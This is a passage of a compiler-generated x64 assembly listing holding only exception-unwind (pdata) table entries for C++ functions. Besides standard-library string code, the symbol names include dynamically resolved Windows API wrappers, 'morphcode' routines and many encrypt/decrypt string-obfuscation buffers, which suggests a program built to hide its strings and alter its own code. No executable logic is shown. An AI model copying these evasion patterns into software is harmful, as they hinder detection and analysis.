	DD	imagerel $unwind$?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ DD imagerel $LN5
	DD	imagerel $LN5+84
	DD	imagerel $unwind$?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+71
	DD	imagerel $unwind$??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+82
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z DD imagerel $LN3
	DD	imagerel $LN3+143
	DD	imagerel $unwind$??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z DD imagerel $LN3
	DD	imagerel $LN3+83
	DD	imagerel $unwind$?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+144
	DD	imagerel $unwind$?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+65
	DD	imagerel $unwind$??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z DD imagerel $LN4
	DD	imagerel $LN4+232
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+88
	DD	imagerel $unwind$?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ DD imagerel $LN3
	DD	imagerel $LN3+226
	DD	imagerel $unwind$?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z DD imagerel $LN5
	DD	imagerel $LN5+271
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+84
	DD	imagerel $unwind$?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ DD imagerel $LN4
	DD	imagerel $LN4+196
	DD	imagerel $unwind$?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrlenW@@YAHPEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?plstrlenW@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWaitForSingleObject@@YAKPEAXK@Z DD imagerel $LN3
	DD	imagerel $LN3+89
	DD	imagerel $unwind$?pWaitForSingleObject@@YAKPEAXK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pGetNativeSystemInfo@@YAXPEAU_SYSTEM_INFO@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetCommandLineW@@YAPEA_WXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?pGetCommandLineW@@YAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+101
	DD	imagerel $unwind$?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpiW@@YAHPEB_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcmpiW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z DD imagerel $LN3
	DD	imagerel $LN3+157
	DD	imagerel $unwind$?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?morphcode@@YAXH@Z DD imagerel $LN22
	DD	imagerel $LN22+367
	DD	imagerel $unwind$?morphcode@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?morphcode@@YAXPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?morphcode@@YAXPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?morphcode@@YAXXZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$?morphcode@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Eg_Path@@YAXXZ DD imagerel ??__Eg_Path@@YAXXZ
	DD	imagerel ??__Eg_Path@@YAXXZ+61
	DD	imagerel $unwind$??__Eg_Path@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__Fg_Path@@YAXXZ DD imagerel ??__Fg_Path@@YAXXZ
	DD	imagerel ??__Fg_Path@@YAXXZ+37
	DD	imagerel $unwind$??__Fg_Path@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SToI@@YAHPEAD@Z DD imagerel $LN17
	DD	imagerel $LN17+375
	DD	imagerel $unwind$?SToI@@YAHPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z DD imagerel $LN9
	DD	imagerel $LN9+159
	DD	imagerel $unwind$?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z DD imagerel $LN8
	DD	imagerel $LN8+133
	DD	imagerel $unwind$?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ConvertSizeStr@@YAHPEA_W@Z DD imagerel $LN5
	DD	imagerel $LN5+244
	DD	imagerel $unwind$?ConvertSizeStr@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?HandleCommandLine@@YAHPEA_W@Z DD imagerel $LN17
	DD	imagerel $LN17+750
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0CN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$06U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+836
	DD	imagerel $unwind$??0?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0EP@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+416
	DD	imagerel $unwind$??0?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FD@$0HL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GL@$0EM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
